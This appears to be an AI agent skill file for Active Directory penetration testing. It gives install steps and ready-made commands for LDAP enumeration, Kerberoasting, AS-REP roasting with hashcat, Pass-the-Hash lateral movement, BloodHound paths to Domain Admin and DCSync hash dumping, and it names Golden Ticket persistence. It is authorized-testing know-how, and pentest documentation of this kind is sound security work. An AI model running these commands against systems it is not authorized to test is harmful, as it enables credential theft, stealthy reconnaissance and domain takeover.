---
name: ad-offensive
description: |
  Active Directory and Windows environment offensive testing engine. Covers Kerberoasting,
  AS-REP Roasting, Pass-the-Hash, Pass-the-Ticket, DCSync attacks, BloodHound attack path
  analysis, LDAP reconnaissance, GPO abuse, ACL exploitation, and domain persistence techniques.
  Maps findings to MITRE ATT&CK for Enterprise and CIS Active Directory Security Benchmarks.
  Integrates BloodHound/SharpHound, Impacket, CrackMapExec, and Kerbrute.
metadata:
  {
    "openclaw":
      {
        "emoji": "🏛️",
        "requires":
          {
            "bins": ["python3", "nmap"],
            "optional": ["bloodhound", "crackmapexec", "kerbrute", "impacket"],
          },
        "install":
          [
            {
              "id": "pip-impacket",
              "kind": "shell",
              "cmd": "pip3 install impacket",
              "bins": ["GetUserSPNs.py"],
              "label": "Install Impacket (pip)",
            },
            {
              "id": "brew-crackmapexec",
              "kind": "brew",
              "formula": "crackmapexec",
              "bins": ["crackmapexec"],
              "label": "Install CrackMapExec (brew)",
            },
            {
              "id": "brew-bloodhound",
              "kind": "brew",
              "formula": "bloodhound",
              "bins": ["bloodhound"],
              "label": "Install BloodHound (brew)",
            },
          ],
      },
  }
---

# Active Directory Offensive Testing Skill

AI-driven Active Directory penetration testing engine for enterprise environment assessments.

## Capabilities

### 1. LDAP Reconnaissance & User Enumeration

Enumerate users, groups, computers, OUs, and GPOs from domain LDAP without triggering alerts.

**Usage:**

> Enumerate Active Directory users and groups at DC: 192.168.1.10, Domain: corp.local

**Tools:** `ldapsearch`, `crackmapexec`, `enum4linux-ng`

**Commands:**

```bash
crackmapexec ldap DC_IP -u '' -p '' --users
ldapsearch -H ldap://DC_IP -x -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
```

**References:** MITRE ATT&CK: T1069, T1087 (Account Discovery)

---

### 2. Kerberoasting (SPN Account Attack)

Request Service Ticket Granting Service (TGS) tickets for accounts with SPNs and crack offline.

**Usage:**

> Perform Kerberoasting against corp.local domain using credentials user:password

**Tools:** `GetUserSPNs.py` (Impacket), `Rubeus`

**Commands:**

```bash
python3 GetUserSPNs.py corp.local/user:password -dc-ip DC_IP -request -outputfile hashes.txt
hashcat -m 13100 hashes.txt wordlist.txt
```

**References:** MITRE ATT&CK: T1558.003

---

### 3. AS-REP Roasting

Attack accounts with Kerberos pre-authentication disabled to obtain offline-crackable hashes.

**Usage:**

> Perform AS-REP Roasting against users in corp.local

**Tools:** `GetNPUsers.py` (Impacket)

**Commands:**

```bash
python3 GetNPUsers.py corp.local/ -dc-ip DC_IP -no-pass -usersfile users.txt
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

**References:** MITRE ATT&CK: T1558.004

---

### 4. Pass-the-Hash / Pass-the-Ticket

Lateral movement using captured NTLM hashes or Kerberos tickets without cracking.

**Usage:**

> Perform Pass-the-Hash lateral movement using admin hash: aad3b435...

**Tools:** `crackmapexec`, `psexec.py` (Impacket), `wmiexec.py`

**Commands:**

```bash
crackmapexec smb SUBNET -u admin -H NTLM_HASH --local-auth
python3 psexec.py -hashes :NTLM_HASH admin@TARGET
```

**References:** MITRE ATT&CK: T1550.002, T1550.003

---

### 5. BloodHound Attack Path Analysis

Graph-based analysis to find the shortest attack path to Domain Admin.

**Usage:**

> Run BloodHound analysis against corp.local and find path to Domain Admin

**Tools:** `SharpHound.exe`, `bloodhound-python`, BloodHound Cypher queries

**Commands:**

```bash
bloodhound-python -u user -p password -d corp.local -dc DC_IP --zip
# In BloodHound: "Find Shortest Paths to Domain Admins"
```

**References:** MITRE ATT&CK: TA0008 (Lateral Movement)

---

### 6. DCSync Attack (Domain Credential Theft)

Replicate domain credentials as if you were a Domain Controller to dump all NTLM hashes.

**Usage:**

> Perform DCSync to dump all domain credentials from corp.local

**Tools:** `secretsdump.py` (Impacket), Mimikatz

**Commands:**

```bash
python3 secretsdump.py corp.local/admin:password@DC_IP -just-dc-ntlm
```

**References:** MITRE ATT&CK: T1003.006

---

### 7. GPO & ACL Abuse

Exploit insecure Group Policy Object permissions and ACL misconfigurations for privilege escalation.

**Usage:**

> Check for exploitable GPO permissions and ACL misconfigurations in corp.local

**Checks:**

- WriteDACL / GenericAll on GPOs
- AddMember rights on privileged groups
- ForceChangePassword on admin accounts

**Tools:** BloodHound, PowerView

**References:** MITRE ATT&CK: T1484.001

---

### 8. AD Domain Persistence

Establish persistence via Golden Tickets, Silver Tickets, Domain Backdoors, and AdminSDHolder.

**Usage:**

> Establish domain persistence after gaining DA on corp.local (lab environment only)

**Techniques:**

- Golden Ticket (KRBTGT hash abuse)
- Silver Ticket (service-specific)
- AdminSDHolder ACL modification
- SID History injection

**References:** MITRE ATT&CK: T1558.001, T1134.005

---

## Quick Commands

| Action     | Command                                            |
| ---------- | -------------------------------------------------- |
| SMB Enum   | `crackmapexec smb DC_IP -u user -p pass --shares`  |
| User Enum  | `kerbrute userenum users.txt --dc DC_IP -d DOMAIN` |
| Kerberoast | `python3 GetUserSPNs.py DOMAIN/user:pass -request` |
| BloodHound | `bloodhound-python -u user -p pass -d DOMAIN`      |
| DCSync     | `python3 secretsdump.py DOMAIN/admin:pass@DC_IP`   |
